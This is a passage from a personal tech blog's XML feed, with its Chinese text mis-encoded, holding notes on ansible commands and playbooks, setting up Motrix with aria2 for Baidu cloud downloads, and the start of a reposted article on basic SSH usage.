å†æŠŠéœ€è¦çš„ç»“æœæ‹‰å›æ‰§è¡Œå‘½ä»¤çš„æœºå™¨</li></ul></li><li><p>Script: è¿è¡Œè„šæœ¬</p></li></ul><p>-a â€œ/PATH/TO/SCRIPT_FILEâ€<br>ansible all -m script -a shel.sh</p><h3 id="ansible-vault-åŠ å¯†è§£å¯†"><a href="#ansible-vault-åŠ å¯†è§£å¯†" class="headerlink" title="ansible-vault åŠ å¯†è§£å¯†"></a>ansible-vault åŠ å¯†è§£å¯†</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ansible-vault encrypt file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault decrypt file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault edit file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault view file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault reykey file.yml</span><br></pre></td></tr></table></figure><h3 id="ansible-console-äº¤äº’"><a href="#ansible-console-äº¤äº’" class="headerlink" title="ansible-console äº¤äº’"></a>ansible-console äº¤äº’</h3><h3 id="YAML-è¯­æ³•"><a href="#YAML-è¯­æ³•" class="headerlink" title="YAML è¯­æ³•"></a>YAML è¯­æ³•</h3><p>åœ¨å•ä¸€æ¡£æ¡ˆä¸­, å¯ç”¨è¿ç»­ä¸‰ä¸ªè¿å­—å·(â€”)åŒºåˆ†å¤šä¸ªæ¡£æ¡ˆ. å¦å¤–, è¿˜æœ‰é€‰æ‹©æ€§çš„è¿ç»­ä¸‰ä¸ªç‚¹å¥½(â€¦)ç”¨æ¥è¡¨ç¤ºæ¡£æ¡ˆç»“å°¾<br>é£æ ¼å’Œpythonç±»ä¼¼<br>ä¸€ä¸ªå®Œæ•´ä»£ç åŠŸèƒ½éœ€æœ€å°‘å…ƒç´ åŒ…å« name: task<br>                            module: arguments (arguments ä¸€èˆ¬æ˜¯ key=value)<br>æ‹“å±•åé€šå¸¸ä¸º yml æˆ– yaml</p><p>æ¨¡æ¿:</p><pre><code>- hosts: websrvs  remote_user: root    tasks:       - name: test connection        ping:</code></pre><p>ansibleç›®å½•ä¸‹ vars.yml ä¸“ç”¨äºå­˜æ”¾å˜é‡</p><h3 id="ansible-playbook"><a href="#ansible-playbook" class="headerlink" title="ansible-playbook"></a>ansible-playbook</h3><ul><li><p>è¿è¡Œ playbook çš„æ–¹å¼<br>  ansible-playbook &lt;filename.yml&gt; â€¦ [options]</p><ul><li>-check æ£€æŸ¥</li><li>â€“list-hosts åˆ—å‡ºè¿è¡Œä»»åŠ¡çš„ä¸»æœº</li><li>â€“limit åªé’ˆå¯¹ä¸»æœºåˆ—è¡¨ä¸­çš„ä¸»æœºæ‰§è¡Œ</li><li>-v æ˜¾ç¤ºè¿‡ç¨‹ -vv -vvv æ›´è¯¦ç»†</li></ul></li><li><p>ä¸€ä¸ªæ¨¡å—åªå¯¹åº”ä¸€ä¸ªå†…å®¹</p></li></ul><p>å¦‚ä¸‹:</p><pre><code>task :  - name: copy file1    copy: src=file1 dest=/path/    copy: src=file2 dest=/path/</code></pre><p>è¿™æ ·åªä¼š copy file2</p><p>é¡ºä¾¿è®°ä¸‹ backup å‚æ•°, backup=yes ä¼šåœ¨å¤åˆ¶å‰å¤‡ä»½ä¸€ä¸ª, é˜²æ­¢è¦†ç›–.<br>å¤‡ä»½çš„æ–‡ä»¶åæ˜¯: æ–‡ä»¶å_éšæœºæ•°_æ—¶é—´</p><ul><li>ignore_errors</li></ul><p>å³ä½¿é€”ä¸­å‡ºé”™ä¹Ÿä¼šç»§ç»­è¿è¡Œ: </p><pre><code>tasks:  - name: rum and ignore the result    shell: ...    ignore_errors: True</code></pre><ul><li><p>handlers ä¸ notify è§¦å‘äº‹ä»¶</p><ul><li>handlers ç”¨äºå½“å…³æ³¨çš„èµ„æºå‘ç”Ÿå˜åŒ–æ—¶, æ‰ä¼šæ‰ä¼šé‡‡å–ä¸€å®šçš„æ“ä½œ</li><li>notify è°ƒç”¨ handler ä¸­å®šä¹‰çš„æ“ä½œ</li><li>handlers ä¸ tasks åŒçº§, å¹¶ä¸” notify åå­—éœ€è¦ä¸ handlers ä¸­çš„ name åå­—ç›¸åŒ</li></ul><p>  hosts: websrvs<br>  remote_user: root</p><pre><code>tasks:  - name: add group nginx    user: name=nginx state=present  - name: add user nginx    user: name=nginx state=present group=nginx   - name: install Nginx    yum: name=nginx state=present    notify:      - restart Nginx      - check Nginx processhandlers:  - name: restart Nginx    service: name=nginx state=restartd enabled=yes  - name: check Nginx process    shell: killall -0 nginx</code></pre></li><li><p>tags æ ‡ç­¾</p></li></ul><p>å¯ä»¥å•ç‹¬åªæ‰§è¡Œæ ‡ç­¾<br>å¤šä¸ªåŠ¨ä½œå¯ä»¥å…¬ç”¨ä¸€ä¸ªæ ‡ç­¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook -t æ ‡ç­¾ æ–‡ä»¶.yml</span><br></pre></td></tr></table></figure><ul><li><p>å˜é‡çš„ä½¿ç”¨</p><ul><li>ansible setup facts è¿œç¨‹ä¸»æœºçš„æ‰€æœ‰å˜é‡éƒ½å¯ç›´æ¥è°ƒç”¨<br>  ansible all -m setup æŸ¥çœ‹æ‰€æœ‰ç³»ç»Ÿè‡ªå¸¦å˜é‡</li><li>åœ¨ /etc/ansible/hosts ä¸­å®šä¹‰<br>  æ™®é€šå˜é‡: ä¸»æœºç»„ä¸­ä¸»æœºå•ç‹¬å®šä¹‰, ä¼˜å…ˆçº§é«˜äºå…¬å…±å˜é‡<br>  å¦‚: [websrvs]<pre><code>  192.168.22.33 http_port=81  192.168.22.34 http_port=82</code></pre>  å…¬å…±(ç»„)å˜é‡: é’ˆå¯¹ä¸»æœºç»„ä¸­æ‰€æœ‰ä¸»æœºå®šä¹‰ç»Ÿä¸€å˜é‡<br>  å¦‚: [websrvs:vars]<pre><code>  nodename=www  domainname=example.com</code></pre></li><li>é€šè¿‡å‘½ä»¤è¡Œåˆ¶å®šå˜é‡, ä¼˜å…ˆçº§æœ€é«˜<br>  å¦‚: ansible-playbook -e varname=value</li><li>åœ¨ playbook ä¸­å®šä¹‰<br>  vars:<pre><code>\- var1:value1\- var12:value2</code></pre></li><li>åœ¨ role ä¸­å®šä¹‰</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Motrix + aria2 è¸©å‘</title>
      <link href="2019/07/08/Motrix+aria2_%E8%B8%A9%E5%9D%91/"/>
      <url>2019/07/08/Motrix+aria2_%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h4 id="æ¡ˆå‘å‰-è¢«-é¨·äº‚æ™‚ç¯€çš„å°‘å¥³å€‘-çš„OP-ä¹™å¥³ã©ã‚‚ã‚ˆ-å¸å¼•æƒ³å»è¿½ç•ªçš„æˆ‘-çœ‹ç€çœ‹ç€çªç„¶æœ‰ä¸¤ä¸ªåŸŸåèµ„æºåŠ è½½ä¸å‡ºæ¥-ç„¶åæƒ³ç€æŠŠè¿™ä¸¤ä¸ªåŸŸååŠ å…¥åˆ°æˆ‘çš„pacä¸­-ç„¶åå‘ç°-æˆ‘çš„pacåªç”¨é“¾æ¥çš„-â€¦äºæ˜¯å°±è·‘åˆ°åˆ«äººç½‘ç›˜ä¸Šå»ä¸‹è½½pacäº†-å°±çªç„¶æƒ³èµ·ç½‘é¡µç‰ˆç½‘ç›˜è¿˜èƒ½å…¨é€Ÿè·‘çš„éªšæ“ä½œ-æƒ³å®‰è£…ä¸€æ³¢â€¦"><a href="#æ¡ˆå‘å‰-è¢«-é¨·äº‚æ™‚ç¯€çš„å°‘å¥³å€‘-çš„OP-ä¹™å¥³ã©ã‚‚ã‚ˆ-å¸å¼•æƒ³å»è¿½ç•ªçš„æˆ‘-çœ‹ç€çœ‹ç€çªç„¶æœ‰ä¸¤ä¸ªåŸŸåèµ„æºåŠ è½½ä¸å‡ºæ¥-ç„¶åæƒ³ç€æŠŠè¿™ä¸¤ä¸ªåŸŸååŠ å…¥åˆ°æˆ‘çš„pacä¸­-ç„¶åå‘ç°-æˆ‘çš„pacåªç”¨é“¾æ¥çš„-â€¦äºæ˜¯å°±è·‘åˆ°åˆ«äººç½‘ç›˜ä¸Šå»ä¸‹è½½pacäº†-å°±çªç„¶æƒ³èµ·ç½‘é¡µç‰ˆç½‘ç›˜è¿˜èƒ½å…¨é€Ÿè·‘çš„éªšæ“ä½œ-æƒ³å®‰è£…ä¸€æ³¢â€¦" class="headerlink" title="æ¡ˆå‘å‰: è¢«ã€€é¨·äº‚æ™‚ç¯€çš„å°‘å¥³å€‘ã€€çš„OP ä¹™å¥³ã©ã‚‚ã‚ˆ å¸å¼•æƒ³å»è¿½ç•ªçš„æˆ‘, çœ‹ç€çœ‹ç€çªç„¶æœ‰ä¸¤ä¸ªåŸŸåèµ„æºåŠ è½½ä¸å‡ºæ¥, ç„¶åæƒ³ç€æŠŠè¿™ä¸¤ä¸ªåŸŸååŠ å…¥åˆ°æˆ‘çš„pacä¸­, ç„¶åå‘ç°, æˆ‘çš„pacåªç”¨é“¾æ¥çš„,â€¦äºæ˜¯å°±è·‘åˆ°åˆ«äººç½‘ç›˜ä¸Šå»ä¸‹è½½pacäº†. å°±çªç„¶æƒ³èµ·ç½‘é¡µç‰ˆç½‘ç›˜è¿˜èƒ½å…¨é€Ÿè·‘çš„éªšæ“ä½œ, æƒ³å®‰è£…ä¸€æ³¢â€¦"></a>æ¡ˆå‘å‰: è¢«ã€€é¨·äº‚æ™‚ç¯€çš„å°‘å¥³å€‘ã€€çš„OP ä¹™å¥³ã©ã‚‚ã‚ˆ å¸å¼•æƒ³å»è¿½ç•ªçš„æˆ‘, çœ‹ç€çœ‹ç€çªç„¶æœ‰ä¸¤ä¸ªåŸŸåèµ„æºåŠ è½½ä¸å‡ºæ¥, ç„¶åæƒ³ç€æŠŠè¿™ä¸¤ä¸ªåŸŸååŠ å…¥åˆ°æˆ‘çš„pacä¸­, ç„¶åå‘ç°, æˆ‘çš„pacåªç”¨é“¾æ¥çš„,â€¦äºæ˜¯å°±è·‘åˆ°åˆ«äººç½‘ç›˜ä¸Šå»ä¸‹è½½pacäº†. å°±çªç„¶æƒ³èµ·ç½‘é¡µç‰ˆç½‘ç›˜è¿˜èƒ½å…¨é€Ÿè·‘çš„éªšæ“ä½œ, æƒ³å®‰è£…ä¸€æ³¢â€¦</h4><p>ç„¶åå°±å®Œå…¨å¿˜äº†çœ‹ç•ªè¿™ä»¶äº‹äº†â€¦..</p><h3 id="Motrix-1-4-1-aria2-1-34-0"><a href="#Motrix-1-4-1-aria2-1-34-0" class="headerlink" title="Motrix(1.4.1) + aria2(1.34.0)"></a>Motrix(1.4.1) + aria2(1.34.0)</h3><p>çªç„¶è§‰å¾—ç™¾åº¦äº‘ç›˜ç›´æ¥ç”¨webç«¯ä¼šæ–¹ä¾¿å¾ˆå¤š,äºæ˜¯æƒ³å°è¯•ç€å»ä½¿ç”¨ <a href="https://github.com/agalwood/Motrix">Motrix</a> + <a href="https://github.com/aria2/aria2">aria2</a> + <a href="https://github.com/acgotaku/BaiduExporter">BaiduExporter</a> çš„ç»„åˆ, ç„¶åå°±æ‰å‘äº†â€¦.</p><h3 id="Motrix-å®˜ç½‘ä¸‹è½½å°±å¥½å•¦"><a href="#Motrix-å®˜ç½‘ä¸‹è½½å°±å¥½å•¦" class="headerlink" title="Motrix å®˜ç½‘ä¸‹è½½å°±å¥½å•¦!"></a>Motrix å®˜ç½‘ä¸‹è½½å°±å¥½å•¦!</h3><h3 id="ç¼–è¯‘å®‰è£…æœ€æ–°ç‰ˆæœ¬æ»´-aria2"><a href="#ç¼–è¯‘å®‰è£…æœ€æ–°ç‰ˆæœ¬æ»´-aria2" class="headerlink" title="ç¼–è¯‘å®‰è£…æœ€æ–°ç‰ˆæœ¬æ»´ aria2"></a>ç¼–è¯‘å®‰è£…æœ€æ–°ç‰ˆæœ¬æ»´ <a href="https://github.com/aria2/aria2/releases">aria2</a></h3><p>è§£å‹è¿›å…¥ç›®å½•ç¼–è¯‘å®‰è£…ä¸€æ¡é¾™â€¦(<strong>è®°å¾—åˆ‡æ¢ä½rootç”¨æˆ·,ä¸ç„¶å®‰è£…æ—¶æœ‰å¯èƒ½æç¤ºæƒé™ä¸å¤Ÿ</strong>)<br>é¢„ç¼–è¯‘ä¹Ÿä¸éœ€è¦åŠ å…¶ä»–æ‹“å±•,é»˜è®¤å°±OKå•¦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">tar &amp;&amp; <span class="built_in">cd</span>  &amp;&amp; ./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>ç»§ç»­ä¿æŒrootç”¨æˆ·, æ–¹ä¾¿æ“ä½œ<br>é…ç½®æ–‡ä»¶ç›®å½•ä»»æ„, ä½†è¦ä¿æŒä¸‹é¢çš„pathéƒ½åœ¨åŒä¸€path .session æ–‡ä»¶ä¸€å®šè¦æœ‰å–”!<br>aria2.conf çš„é…ç½®å¯ä»¥å‚è€ƒä¸‹<a href="https://github.com/TARI0510/Ubuntu/blob/master/arias.conf">æˆ‘æ»´</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /path/aria2 &amp;&amp; touch /path/aria2.session &amp;&amp; chmod 777 /path/aria2.session</span><br><span class="line">vim /path/aria2.conf</span><br></pre></td></tr></table></figure><h3 id="é…ç½®å®Œæˆå°±å¯ä»¥ä½¿ç”¨å•¦-æ‰æ€ª"><a href="#é…ç½®å®Œæˆå°±å¯ä»¥ä½¿ç”¨å•¦-æ‰æ€ª" class="headerlink" title="é…ç½®å®Œæˆå°±å¯ä»¥ä½¿ç”¨å•¦!(æ‰æ€ª)"></a>é…ç½®å®Œæˆå°±å¯ä»¥ä½¿ç”¨å•¦!(æ‰æ€ª)</h3><p>è¦ä¹ˆä½ æ˜¯rootç”¨æˆ·, ä¸ç„¶å¯åŠ¨ aria2c ä¸€å®šè®°å¾—åŠ  <strong>sudo</strong>!! æˆ‘å°±è¢«å‘äº†â€¦emmm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo aria2c --conf-path=/path/aria2/aria2.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ªæ˜¯åœ¨åå°è¿è¡Œ, è¿˜æ²¡ä¸‹è½½æˆåŠŸä¹‹å‰å»ºè®®ç”¨ä¸Šé¢çš„, æ–¹ä¾¿æŸ¥çœ‹è¿è¡Œç»“æœ</span></span><br><span class="line">sudo aria2c --conf-path=/path/aria2/aria2.conf -D</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…-BaiduExporter-æˆ‘ä½¿ç”¨çš„æ˜¯0-8-5"><a href="#å®‰è£…-BaiduExporter-æˆ‘ä½¿ç”¨çš„æ˜¯0-8-5" class="headerlink" title="å®‰è£… BaiduExporter(æˆ‘ä½¿ç”¨çš„æ˜¯0.8.5)"></a>å®‰è£… <a href="https://github.com/acgotaku/BaiduExporter">BaiduExporter</a>(æˆ‘ä½¿ç”¨çš„æ˜¯0.8.5)</h3><p>è®°å¾—å®‰è£…æœ€æ–°ç‰ˆæœ¬, æˆ‘å°±å› ä¸ºæ²¡å®‰è£…æœ€æ–°ç‰ˆæœ¬, ä»–åŸæœ¬å¯¹ pan.baidu.com ä¹‹ç±»çš„åŸŸåæ˜¯æ²¡æœ‰æˆæƒ, å¯¼è‡´aria2è®¿é—®ä¸åˆ°, å“­æ­»â€¦ä»”ç»†çœ‹README.MDçš„é‡è¦æ€§â€¦.</p><p>éšä¾¿æ‰¾ä¸ªå¯ä»¥ä¸‹è½½ç™¾åº¦äº‘çš„é“¾æ¥æ‰“å¼€, çœ‹åˆ° <strong>MO.app</strong> åœ¨ ä¿å­˜åˆ°ç½‘ç›˜ ä¸‹è½½ç­‰æŒ‰é’®é™„ä»¶å°±çŸ¥é“æ’ä»¶å®‰è£…æˆåŠŸå•¦!!(è®°å¾—åœ¨chromeæ‹“å±•çœ‹çœ‹æœ‰æ²¡æœ‰æŠ¥é”™, æŠ¥é”™è¦é‡è£…å–”!)</p><p>è¯´è¯´ MO.app é‡Œé¢ <strong>è®¾ç½®</strong> é‡Œé¢ä¸»è¦å­—æ®µçš„å«ä¹‰å§!</p><h4 id="RPCåœ°å€"><a href="#RPCåœ°å€" class="headerlink" title="RPCåœ°å€"></a>RPCåœ°å€</h4><p>ä½¿ç”¨MOä¸‹è½½: å°±æ˜¯ä¸‹è½½æŒ‰é’®çš„åå­—å•¦!<br>åé¢è·Ÿç€çš„å†…å®¹åœ¨README.MEæœ‰è¯´, æˆ‘çš„æ˜¯<a href="http://token/">http://token</a>:(åœ¨motrix Preference-&gt;Advanced-&gt;Security-&gt;RPCSecret é‡Œé¢çš„å†…å®¹)@localhost:16800/jsonrpc </p><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>åœ¨ Motrix Preference-&gt;Advanced-&gt;Security: Mock User-Agent é€‰æ‹© <strong>du</strong></p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>ä¿æŒé»˜è®¤çš„ <a href="https://pan.baidu.com/disk/home">https://pan.baidu.com/disk/home</a> å°±å¥½å•¦!</p><h4 id="Motrix-çš„é…ç½®æ›´æ”¹åè®°å¾—ç‚¹-Save-amp-Apply-å°±å¥½å•¦"><a href="#Motrix-çš„é…ç½®æ›´æ”¹åè®°å¾—ç‚¹-Save-amp-Apply-å°±å¥½å•¦" class="headerlink" title="Motrix çš„é…ç½®æ›´æ”¹åè®°å¾—ç‚¹ Save &amp; Apply å°±å¥½å•¦!"></a>Motrix çš„é…ç½®æ›´æ”¹åè®°å¾—ç‚¹ Save &amp; Apply å°±å¥½å•¦!</h4><h3 id="æˆ‘è¸©æ»´å‘"><a href="#æˆ‘è¸©æ»´å‘" class="headerlink" title="æˆ‘è¸©æ»´å‘"></a>æˆ‘è¸©æ»´å‘</h3><h4 id="ä¸€"><a href="#ä¸€" class="headerlink" title="ä¸€"></a>ä¸€</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">07/07 22:22:06 [ERROR] Failed to serialize session to <span class="string">&#x27;/etc/aria2/aria2.session&#x27;</span>.</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸»è¦æ˜¯å› ä¸ºæˆ‘æ²¡æœ‰ç”¨ sudo è¿è¡Œ aria2c</p><h4 id="äºŒ"><a href="#äºŒ" class="headerlink" title="äºŒ"></a>äºŒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">07/07 23:46:37 [ERROR] CUID<span class="comment">#10 - Download aborted. URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4</span></span><br><span class="line">Exception: [AbstractCommand.cc:351] errorCode=22 URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4</span><br><span class="line">  -&gt; [HttpSkipResponseCommand.cc:240] errorCode=22 </span><br><span class="line">  The response status is not successful. status=403</span><br><span class="line"></span><br><span class="line">07/07 23:46:37 [NOTICE] Download GID<span class="comment">#2384700d4e908591 not complete: /home/tari/Downloads/å›é¡¾è§†é¢‘.mp4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸»è¦æ˜¯å› ä¸ºæˆ‘æ’ä»¶å…³äºç™¾åº¦äº‘ç›˜çš„åŸŸåæˆæƒé—®é¢˜, ä¿æŒå¥½æ’ä»¶æœ€æ–°ç‰ˆæœ¬å°±å¥½å•¦!</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ˜è…¾ </category>
          
          <category> Motrix </category>
          
          <category> aria2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ—¥å¸¸æŠ˜è…¾ </tag>
            
            <tag> Motrix </tag>
            
            <tag> aria2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about ssh</title>
      <link href="2019/07/06/ssh/"/>
      <url>2019/07/06/ssh/</url>
      
        <content type="html"><![CDATA[<h3 id="etc-hosts-deny-ç¦ç”¨æ— æ•ˆ"><a href="#etc-hosts-deny-ç¦ç”¨æ— æ•ˆ" class="headerlink" title="/etc/hosts.deny ç¦ç”¨æ— æ•ˆ"></a>/etc/hosts.deny ç¦ç”¨æ— æ•ˆ</h3><p>åŸå› ï¼šç¼–è¯‘å®‰è£…æ—¶é»˜è®¤æ²¡æœ‰åŠ è½½libwrapåº“</p><p>[è½¬è½½è‡ª <a href="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&mid=2247485564&idx=2&sn=38620597bda9f3dfdd7208c4f94d7ff2&chksm=fd1c70faca6bf9ec7fab69f1fdd5453f63bd7040940b33b1a730c1d12a42675424b70f906e69&mpshare=1&scene=1&srcid=&key=87f46a9190202d8fe4b26708a8287afdd783bcdb437852de4172f55513c3c4bbd3a4364ee67068e983d84c07bb884d0298b24e15cb905ce6fa82db7ec104b33886b6e02e2e359a596cdec79929c1174e&ascene=1&uin=MjMxMTMxNDIxMw==&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=Ks6ARNaAyjOn+MDn0BlfGaZi3QgnAKBugECR9dT+pk7bVXvF/R+0jnIDyFwuIf9P">è‰¯è®¸Linux</a>]</p><h4 id="Secure-Shellç¼©å†™æ˜¯SSHï¼Œ-ç”±IETFçš„ç½‘ç»œå·¥ä½œå°ç»„ï¼ˆNetwork-Working-Groupï¼‰æ‰€åˆ¶å®šï¼ŒSSHæ˜¯ä¸€é¡¹åˆ›å»ºåœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ï¼Œä¸ºè®¡ç®—æœºçš„shellæä¾›å®‰å…¨çš„ä¼ è¾“å’Œä½¿ç”¨ç¯å¢ƒã€‚"><a href="#Secure-Shellç¼©å†™æ˜¯SSHï¼Œ-ç”±IETFçš„ç½‘ç»œå·¥ä½œå°ç»„ï¼ˆNetwork-Working-Groupï¼‰æ‰€åˆ¶å®šï¼ŒSSHæ˜¯ä¸€é¡¹åˆ›å»ºåœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ï¼Œä¸ºè®¡ç®—æœºçš„shellæä¾›å®‰å…¨çš„ä¼ è¾“å’Œä½¿ç”¨ç¯å¢ƒã€‚" class="headerlink" title="Secure Shellç¼©å†™æ˜¯SSHï¼Œ ç”±IETFçš„ç½‘ç»œå·¥ä½œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼ŒSSHæ˜¯ä¸€é¡¹åˆ›å»ºåœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ï¼Œä¸ºè®¡ç®—æœºçš„shellæä¾›å®‰å…¨çš„ä¼ è¾“å’Œä½¿ç”¨ç¯å¢ƒã€‚"></a>Secure Shellç¼©å†™æ˜¯SSHï¼Œ ç”±IETFçš„ç½‘ç»œå·¥ä½œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼ŒSSHæ˜¯ä¸€é¡¹åˆ›å»ºåœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ï¼Œä¸ºè®¡ç®—æœºçš„shellæä¾›å®‰å…¨çš„ä¼ è¾“å’Œä½¿ç”¨ç¯å¢ƒã€‚</h4><p>ä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç» SSH çš„ 7 å¤§ç”¨æ³•ã€‚</p><h3 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p>æœ€ç®€å•çš„ç”¨æ³•å°±æ˜¯ä¸å¸¦å‚æ•°ï¼Œä»…è¾“å…¥ ssh å†åŠ ä¸Šä¸»æœºåœ°å€ï¼Œæ¯”å¦‚ï¼š</p><p>ssh 192.168.0.116<br>è¿™ç§å½¢å¼ç™»é™†ä¸»æœºï¼Œä¼šé»˜è®¤ä½¿ç”¨å½“å‰ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚ç¬¬ä¸€æ¬¡è¿æ¥çš„æ—¶å€™ï¼ŒSSH ä¼šç¡®è®¤ç›®æ ‡ä¸»æœºçš„çœŸå®æ€§ï¼Œå¦‚æœæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œè¾“å…¥ yes å³å¯ã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³è¦ä»¥æŒ‡å®šç”¨æˆ·åæ¥ç™»å½•ä¸»æœºï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><p>a. ä½¿ç”¨ -l é€‰é¡¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -l alvin 192.168.0.116</span><br></pre></td></tr></table></figure><p>b. ä½¿ç”¨ user@hostname æ ¼å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh alvin@192.168.0.116</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§æ–¹æ³•ï¼Œå…¶ä¸­ç¬¬äºŒç§å°¤ä¸ºå¸¸ç”¨ã€‚</p><h3 id="æŒ‡å®šç«¯å£ç™»å½•"><a href="#æŒ‡å®šç«¯å£ç™»å½•" class="headerlink" title="æŒ‡å®šç«¯å£ç™»å½•"></a>æŒ‡å®šç«¯å£ç™»å½•</h3><p>SSH é»˜è®¤ä½¿ç”¨çš„ç«¯å£å·æ˜¯ 22ã€‚å¤§å¤šç°ä»£çš„ Linux ç³»ç»Ÿ 22 ç«¯å£éƒ½æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœä½ è¿è¡Œ ssh ç¨‹åºè€Œæ²¡æœ‰æŒ‡å®šç«¯å£å·ï¼Œå®ƒç›´æ¥å°±æ˜¯é€šè¿‡ 22 ç«¯å£å‘é€è¯·æ±‚çš„ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä¸æƒ³é€šè¿‡ 22 ç«¯å£ç™»å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ -p é€‰é¡¹æ¥æŒ‡å®šç«¯å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.0.116 -p 1234</span><br></pre></td></tr></table></figure><p>å¼•ç”³è¯é¢˜ï¼šå¦‚ä½•ä¿®æ”¹ç«¯å£å·ï¼Ÿ<br>åªéœ€ä¿®æ”¹ /etc/ssh/ssh_config ï¼Œä¿®æ”¹å¦‚ä¸‹ä¸€è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 22</span><br></pre></td></tr></table></figure><h3 id="å¯¹æ‰€æœ‰æ•°æ®è¯·æ±‚å‹ç¼©"><a href="#å¯¹æ‰€æœ‰æ•°æ®è¯·æ±‚å‹ç¼©" class="headerlink" title="å¯¹æ‰€æœ‰æ•°æ®è¯·æ±‚å‹ç¼©"></a>å¯¹æ‰€æœ‰æ•°æ®è¯·æ±‚å‹ç¼©</h3><p>ä½¿ç”¨ -C é€‰é¡¹ï¼Œæ‰€æœ‰é€šè¿‡ SSH å‘é€æˆ–æ¥æ”¶çš„æ•°æ®å°†ä¼šè¢«å‹ç¼©ï¼Œå¹¶ä¸”ä»»ç„¶æ˜¯åŠ å¯†çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -C 